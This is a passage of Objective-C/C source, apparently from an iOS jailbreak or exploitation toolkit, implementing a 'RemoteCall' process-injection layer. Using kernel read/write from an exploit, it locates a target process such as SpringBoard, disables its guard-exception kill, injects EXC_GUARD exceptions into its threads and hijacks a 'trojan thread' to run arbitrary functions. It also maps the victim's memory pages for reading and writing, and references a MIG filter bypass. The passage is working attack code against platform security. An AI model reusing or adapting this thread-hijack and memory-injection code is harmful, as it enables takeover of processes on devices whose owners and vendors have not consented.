        g_RC_success = false;
    }
    return retValue;
}

uint64_t do_remote_call_stable(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (g_RC_vphoneBridgeMode) {
        return vphone_bridge_call(CY_VPHONE_SB_CMD_CALL_NAME,
                                  0,
                                  name,
                                  timeout,
                                  x0,
                                  x1,
                                  x2,
                                  x3,
                                  x4,
                                  x5,
                                  x6,
                                  x7);
    }

    if (!g_RC_creatingExtraThread)
        return do_remote_call_temp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);

    uint64_t pcAddr = (uint64_t)dlsym(RTLD_DEFAULT, name);
    if (!pcAddr) {
        printf("[%s:%d] Unable to find symbol: %s\n", __FUNCTION__, __LINE__, name);
        g_RC_success = false;
        return 0;
    }
    return do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
}

uint64_t do_remote_call_stable_addr(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    if (g_RC_vphoneBridgeMode) {
        return vphone_bridge_call(CY_VPHONE_SB_CMD_CALL_ADDR,
                                  pcAddr,
                                  name,
                                  timeout,
                                  x0,
                                  x1,
                                  x2,
                                  x3,
                                  x4,
                                  x5,
                                  x6,
                                  x7);
    }

    if (!g_RC_creatingExtraThread)
        return 0;

    if (!pcAddr) {
        printf("[%s:%d] NULL function pointer: %s\n", __FUNCTION__, __LINE__, name ?: "(addr-call)");
        g_RC_success = false;
        return 0;
    }
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;

    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on new thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN);
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_secondExceptionPort, &exc2, newTimeout, false)) {
        printf("[%s:%d] Don't receive second exception on new thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    reply_with_state(&exc2, &exc2.threadState);
    if (remote_call_should_log_result(name, true))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
    return retValue;
}

bool restore_trojan_thread(arm_thread_state64_internal *state)
{
    ExceptionMessage exc;
    int restoreTimeoutMS = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 20000;
    if (restoreTimeoutMS < 1000) restoreTimeoutMS = 1000;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, restoreTimeoutMS, false)) {
        printf("[%s:%d] Failed to receive exception while restoring within %dms\n",
               __FUNCTION__, __LINE__, restoreTimeoutMS);
        return false;
    }
    
    state->__flags = exc.threadState.__flags;
    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
    reply_with_state(&exc, state);
    return true;
}

void abandon_remote_call(void) {
    if (g_RC_vphoneBridgeMode) {
        vphone_bridge_close_current();
        g_RC_vphoneBridgeMode = false;
        g_RC_taskAddr = 0;
        g_RC_pid = 0;
        g_RC_success = false;
        g_RC_creatingExtraThread = false;
        g_RC_trojanMem = 0;
        g_RC_threadList = [NSMutableArray new];
        return;
    }

    // Skip every SB-side IPC. Caller has decided that the remote task is dead
    // (typically SpringBoard finished a respawn). Touching the dead trojan
    // would hang for the call timeout. Local resources still need releasing.
    destroy_exception_port(g_RC_firstExceptionPort);
    destroy_exception_port(g_RC_secondExceptionPort);
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("abandon_remote_call");
    g_RC_taskAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_trojanThreadAddr = 0;
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_trojanMem = 0;
    g_RC_threadList = [NSMutableArray new];
}

int destroy_remote_call(void) {
    if (g_RC_vphoneBridgeMode) {
        if (g_RC_trojanMem) {
            (void)do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
        }
        vphone_bridge_close_current();
        g_RC_vphoneBridgeMode = false;
        g_RC_taskAddr = 0;
        g_RC_pid = 0;
        g_RC_success = false;
        g_RC_creatingExtraThread = false;
        g_RC_trojanMem = 0;
        g_RC_threadList = [NSMutableArray new];
        return 0;
    }

    if (!remote_call_has_local_state()) {
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("destroy_remote_call");
        g_RC_success = false;
        g_RC_threadList = [NSMutableArray new];
        return 0;
    }

    if (g_RC_trojanMem) {
        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
        g_RC_trojanMem = 0;
    }
    if (g_RC_creatingExtraThread) {
        do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
    }
    else {
        restore_trojan_thread(&g_RC_originalState);
    }

    destroy_exception_port(g_RC_firstExceptionPort);
    destroy_exception_port(g_RC_secondExceptionPort);
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("destroy_remote_call");
    g_RC_taskAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_trojanThreadAddr = 0;
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_trojanMem = 0;
    
    g_RC_threadList = [NSMutableArray new];
    
    return 0;
}

bool remote_call_has_local_state(void) {
    return g_RC_vphoneBridgeMode ||
           g_RC_vphoneBridgeFD >= 0 ||
           g_RC_taskAddr ||
           MACH_PORT_VALID(g_RC_firstExceptionPort) ||
           MACH_PORT_VALID(g_RC_secondExceptionPort) ||
           g_RC_firstExceptionPortAddr ||
           g_RC_secondExceptionPortAddr ||
           g_RC_dummyThread ||
           MACH_PORT_VALID(g_RC_dummyThreadMach) ||
           g_RC_dummyThreadAddr ||
           g_RC_dummyThreadTro ||
           g_RC_vmMap ||
           g_RC_callThreadAddr ||
           g_RC_trojanThreadAddr ||
           g_RC_pid ||
           g_RC_trojanMem;
}

struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr) {
            g_RC_shmemUseCounter[i] = ++g_RC_shmemClock;
            return &g_RC_shmemCache[i];
        }
    }
    return NULL;
}

struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
{
    int slot = -1;
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!g_RC_shmemCache[i].used) { slot = i; break; }
    }
    if (slot < 0) {
        uint64_t oldest = UINT64_MAX;
        for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
            if (g_RC_shmemUseCounter[i] < oldest) {
                oldest = g_RC_shmemUseCounter[i];
                slot = i;
            }
        }
        if (slot < 0) {
            printf("[%s:%d] g_RC_shmemCache eviction failed\n", __FUNCTION__, __LINE__);
            return NULL;
        }
        release_shmem_slot(slot);
        uint64_t events = ++g_RC_shmemEvictions;
        if (events == 1 || (events % 256) == 0) {
            printf("[RemoteCall] shmem cache LRU evicted slot=%d events=%llu\n",
                   slot, (unsigned long long)events);
        }
    }
    g_RC_shmemCache[slot] = *shmem;
    g_RC_shmemCache[slot].used = true;
    g_RC_shmemUseCounter[slot] = ++g_RC_shmemClock;
    return &g_RC_shmemCache[slot];
}

struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
{
    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
    if (cached) return cached;

    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    if (!newShmem.localAddress) {
        static volatile uint64_t shmemRetryEvents = 0;
        uint64_t events = __sync_add_and_fetch(&shmemRetryEvents, 1);
        if (events == 1 || (events % 64) == 0) {
            printf("[RemoteCall] shmem map failed page=0x%llx; clearing cache and retrying event=%llu\n",
                   pageAddr, (unsigned long long)events);
        }
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("shmem_retry");
        newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
    }
    if (!newShmem.localAddress)
            return NULL;
    return put_shmem_in_cache(&newShmem);
}

bool remote_read(uint64_t src, void *dst, uint64_t size)
{
    if (!src || !dst || !size) return false;
    if (g_RC_vphoneBridgeMode) {
        return vphone_bridge_remote_read(src, dst, size);
    }

    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_read failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
        src     += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

uint64_t remote_read64(uint64_t src)
{
    uint64_t val = 0;
    if (!remote_read(src, &val, sizeof(val))) return 0;
    return val;
}

void remote_hexdump(uint64_t remoteAddr, size_t size)
{
    uint8_t *buf = (uint8_t *)malloc(size);
    if (!buf) {
        return;
    }

    if (!remote_read(remoteAddr, buf, size)) {
        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
        free(buf);
        return;
    }

    char ascii[17];
    ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0)
            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);

        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }

    free(buf);
}

bool remote_write(uint64_t dst, const void *src, uint64_t size)
{
    if (!src || !dst || !size) return false;
    if (g_RC_vphoneBridgeMode) {
        return vphone_bridge_remote_write(dst, src, size);
    }
    
    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }

        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

bool remote_write64(uint64_t dst, uint64_t val)
{
    return remote_write(dst, &val, sizeof(val));
}

bool remote_writeStr(uint64_t dst, const char *str)
{
    if (!str) return false;

    size_t len = strlen(str) + 1;
    return remote_write(dst, str, len);
}

uint64_t remote_call_trojan_mem(void)
{
    return g_RC_trojanMem;
}

uint64_t retry_first_thread(bool useMigFilterBypass) {
    if (useMigFilterBypass)
        mig_bypass_pause();
    
    sleep(1);
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    return kread64(g_RC_taskAddr + off_task_threads_next);
}

// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
int init_remote_call(const char* process, bool useMigFilterBypass) {
    clear_remote_shmem_cache();
    remote_call_note_init_failure(RemoteCallInitFailureNone, 0);
    g_RC_success = true;
    if (g_RC_vphoneBridgeFD == 0) {
        g_RC_vphoneBridgeFD = -1;
    }

    if (process && strcmp(process, "SpringBoard") == 0) {
        bool vphoneBridgeReady = remote_call_vphone_springboard_bridge_available();
        if (!vphoneBridgeReady && g_vphone_mode) {
            printf("[RemoteCall] VPHONE SpringBoard bridge unavailable; refusing legacy task-port RemoteCall path\n");
            g_RC_vphoneBridgeMode = false;
            remote_call_note_init_failure(RemoteCallInitFailureOther, 0);
            return -1;
        }

        if (vphoneBridgeReady) {
            g_RC_vphoneBridgeMode = true;
            g_RC_vphoneBridgeFD = -1;
            if (!vphone_bridge_connect_current(5000)) {
                printf("[RemoteCall] VPHONE SpringBoard bridge disappeared before init\n");
                g_RC_vphoneBridgeMode = false;
                remote_call_note_init_failure(RemoteCallInitFailureOther, 0);
                return -1;
            }

            g_RC_creatingExtraThread = true;
            // vphone bridge mode executes inside SpringBoard through the
            // TweakLoader-hosted socket server, so the app never needs a real
            // task port or pid. Avoid the legacy proc_name()/proc_listallpids()
            // scan here: on vphone's mixed arm64 app / arm64e system userspace it
            // can be killed by AMFI as a CODESIGNING Invalid Page before the bridge
            // session is even opened.
            g_RC_pid = 0;
            g_RC_success = true;
            g_RC_threadList = [NSMutableArray new];

            uint64_t mem = do_remote_call_stable(1000,
                                                 "mmap",
                                                 0,
                                                 PAGE_SIZE,
                                                 VM_PROT_READ | VM_PROT_WRITE,
                                                 MAP_PRIVATE | MAP_ANON,
                                                 (uint64_t)-1,
                                                 0,
                                                 0,
                                                 0);
            if (mem && mem != UINT64_MAX) {
                g_RC_trojanMem = mem;
                (void)do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
            } else {
                g_RC_trojanMem = 0;
                printf("[RemoteCall] VPHONE SpringBoard bridge could not allocate scratch mmap; continuing without trojanMem\n");
            }

            printf("[RemoteCall] VPHONE SpringBoard bridge ready (pid=%d) — TweakLoader backend, no app-side KRW needed.\n",
                   g_RC_pid);
            return 0;
        }
    }

    if (!kexploit_krw_ready()) {
        printf("[%s:%d] KRW unavailable; refusing RemoteCall init for %s\n",
               __FUNCTION__, __LINE__, process);
        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
        return -1;
    }
    
    uint64_t procAddr;
    if (g_RC_targetProcOverride) {
        procAddr = g_RC_targetProcOverride;
        g_RC_targetProcOverride = 0;
        printf("[%s:%d] using caller-supplied proc override for %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
    } else {
        procAddr = proc_find_by_name(process);
        if (!procAddr || procAddr == (uint64_t)-1 ||
            !is_kaddr_valid(procAddr + off_proc_p_pid)) {
            pid_t userPid = remote_call_find_userland_pid_by_name(process);
            if (userPid > 0) {
                uint64_t byPid = proc_find(userPid);
                printf("[%s:%d] proc name lookup fallback for %s userPid=%d proc=%#llx\n",
                       __FUNCTION__, __LINE__, process, userPid, byPid);
                if (byPid && byPid != (uint64_t)-1 &&
                    is_kaddr_valid(byPid + off_proc_p_pid)) {
                    procAddr = byPid;
                }
            } else {
                printf("[%s:%d] userland pid fallback found no process named %s\n",
                       __FUNCTION__, __LINE__, process);
            }
        }
    }
    if (!procAddr || procAddr == (uint64_t)-1 || !is_kaddr_valid(procAddr + off_proc_p_pid)) {
        printf("[%s:%d] process not found or invalid: %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
        remote_call_note_init_failure(RemoteCallInitFailureProcessMissing, 0);
        return -1;
    }
    uint32_t targetPid = kread32(procAddr + off_proc_p_pid);
    printf("[RemoteCall] Found %s in kernel (pid=%u) — preparing EXC_GUARD thread hijack.\n", process, targetPid);
    RC_DEBUG("[%s:%d] process: %s, pid: %u\n", __FUNCTION__, __LINE__, process, targetPid);
    g_RC_taskAddr = proc_task(procAddr);
    if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
        printf("[%s:%d] invalid task for process %s proc=%#llx task=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr, g_RC_taskAddr);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }

    uint64_t selfTask = task_self();
    if (!selfTask || !is_kaddr_valid(selfTask)) {
        printf("[%s:%d] invalid self task while preparing %s RemoteCall task=%#llx\n",
               __FUNCTION__, __LINE__, process, selfTask);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] targetTask=%#llx selfTask=%#llx\n",
             __FUNCTION__, __LINE__, g_RC_taskAddr, selfTask);

    mach_port_t firstExceptionPort = create_exception_port();
    mach_port_t secondExceptionPort = create_exception_port();

    RC_DEBUG("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);
    
    if (!firstExceptionPort || !secondExceptionPort)
    {
        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureExceptionPort, targetPid);
        return -1;
    }
    
    // Make sure the task won't crash after we handle an exception.
    if (disable_excguard_kill(g_RC_taskAddr) != 0) {
        printf("[%s:%d] failed to prepare task_exc_guard for %s task=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureTaskGuard, targetPid);
        return -1;
    }
    
    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?
    
    uint64_t firstPortAddr = task_get_ipc_port_kobject(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = task_get_ipc_port_kobject(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr)
        RC_DEBUG("[%s:%d] exception port kobjects first=%#llx second=%#llx (receive ports may have no kobject)\n",
                 __FUNCTION__, __LINE__, firstPortAddr, secondPortAddr);
    
    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        printf("[%s:%d] dlsym(getpid) failed while preparing dummy thread\n",
               __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] creating local dummy thread for RemoteCall bootstrap\n",
             __FUNCTION__, __LINE__);
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        printf("[%s:%d] pthread_create_suspended_np(dummy) failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, dummyErr, dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (!dummyThreadMach) {
        printf("[%s:%d] pthread_mach_thread_np(dummy) returned null\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadMach=0x%x\n",
             __FUNCTION__, __LINE__, dummyThreadMach);
    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    if (!is_kaddr_valid(dummyThreadAddr)) {
        kutils_debug_ipc_port_resolution(selfTask, dummyThreadMach, "dummy-thread");
        printf("[%s:%d] failed to resolve dummy thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, dummyThreadMach, dummyThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadAddr=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadAddr);
    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
    if (!is_kaddr_valid(dummyThreadTro)) {
        printf("[%s:%d] dummy thread tro invalid %#llx\n",
               __FUNCTION__, __LINE__, dummyThreadTro);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadTro=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadTro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = task_get_ipc_port_kobject(selfTask, threadSelf);
    if (!is_kaddr_valid(selfThreadAddr)) {
        kutils_debug_ipc_port_resolution(selfTask, threadSelf, "self-thread");
        printf("[%s:%d] failed to resolve self thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, threadSelf, selfThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        mach_port_deallocate(mach_task_self_, threadSelf);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
    RC_DEBUG("[%s:%d] selfThreadAddr=%#llx selfThreadCtid=%#x\n",
             __FUNCTION__, __LINE__, selfThreadAddr, selfThreadCtid);
    mach_port_deallocate(mach_task_self_, threadSelf);
    
    g_RC_creatingExtraThread = true;
    g_RC_firstExceptionPort = firstExceptionPort;
    g_RC_secondExceptionPort = secondExceptionPort;
    g_RC_firstExceptionPortAddr = firstPortAddr;
    g_RC_secondExceptionPortAddr = secondPortAddr;
    g_RC_dummyThread = dummyThread;
    g_RC_dummyThreadMach = dummyThreadMach;
    g_RC_dummyThreadAddr = dummyThreadAddr;
    g_RC_dummyThreadTro = dummyThreadTro;
    g_RC_selfThreadAddr = selfThreadAddr;
    g_RC_selfThreadCtid = selfThreadCtid;
    
    g_RC_threadList = [NSMutableArray new];
    
    int targetInjectedThreadCount = 2;
    RC_DEBUG("[%s:%d] Target injected threads: %d\n",
             __FUNCTION__, __LINE__, targetInjectedThreadCount);

    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
    if (!firstThread || !is_kaddr_valid(firstThread)) {
        printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
        destroy_remote_call();
        return -1;
    }
    uint64_t currThread = firstThread;
    
    g_RC_trojanThreadAddr = 0;
    
    if (useMigFilterBypass)
        mig_bypass_resume();
    
    while (successThreadCount < targetInjectedThreadCount && validThreadCount < 5 && retryCount < 3) {
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                break;
            }
        }
        
        if (task == g_RC_taskAddr) {
            if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
                printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                if (!validThreadCount) {
                    printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                    firstThread = retry_first_thread(useMigFilterBypass);
                    currThread = firstThread;
                    retryCount++;
                    continue;
                }
            } else {
                // Inject a EXC_GUARD exception on this thread
                if (!inject_guard_exception(currThread, guardCode)) {
                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                    if (!validThreadCount) {
                        printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                        firstThread = retry_first_thread(useMigFilterBypass);
                        currThread = firstThread;
                        retryCount++;
                        continue;
                    }
                } else {
                    if (!g_RC_trojanThreadAddr)
                        g_RC_trojanThreadAddr = currThread;
                    successThreadCount++;
                    [g_RC_threadList addObject:@(currThread)];
                    RC_DEBUG("[%s:%d] Inject EXC_GUARD on thread:0x%llx OK\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                }
            }
            validThreadCount++;
            if (successThreadCount >= targetInjectedThreadCount) {
                break;
            }
        } else if (task && !validThreadCount) {
            printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
            firstThread = retry_first_thread(useMigFilterBypass);
            currThread = firstThread;
            retryCount++;
            continue;
        }
        
        uint64_t next = kread64(currThread + off_thread_task_threads_next);
        if (!next) {
            if (!validThreadCount) {
                printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                printf("[%s:%d] Break because of empty next thread\n", __FUNCTION__, __LINE__);
                break;
            }
        }
        currThread = next;
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    RC_DEBUG("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
    RC_DEBUG("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
    
    if (g_RC_threadList.count == 0) {
        printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
        abandon_remote_call();
        return -1;
    }
    printf("[RemoteCall] EXC_GUARD injected on %lu thread(s) — waiting for trap.\n", (unsigned long)g_RC_threadList.count);

    ExceptionMessage exc;
    int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
    RC_DEBUG("[%s:%d] First exception wait timeout=%dms\n",
             __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
    if(!wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false)) {
        printf("[%s:%d] Failed to receive first exception within %dms\n",
               __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
        for (NSNumber *thread in g_RC_threadList) {
            clear_guard_exception(thread.unsignedLongLongValue);
        }
        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
        abandon_remote_call();
        return -1;
    }
    
    printf("[RemoteCall] Thread trapped — hijacking execution inside %s.\n", process);
    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));

    for (NSNumber *thread in g_RC_threadList) {
        clear_guard_exception(thread.unsignedLongLongValue);
    }
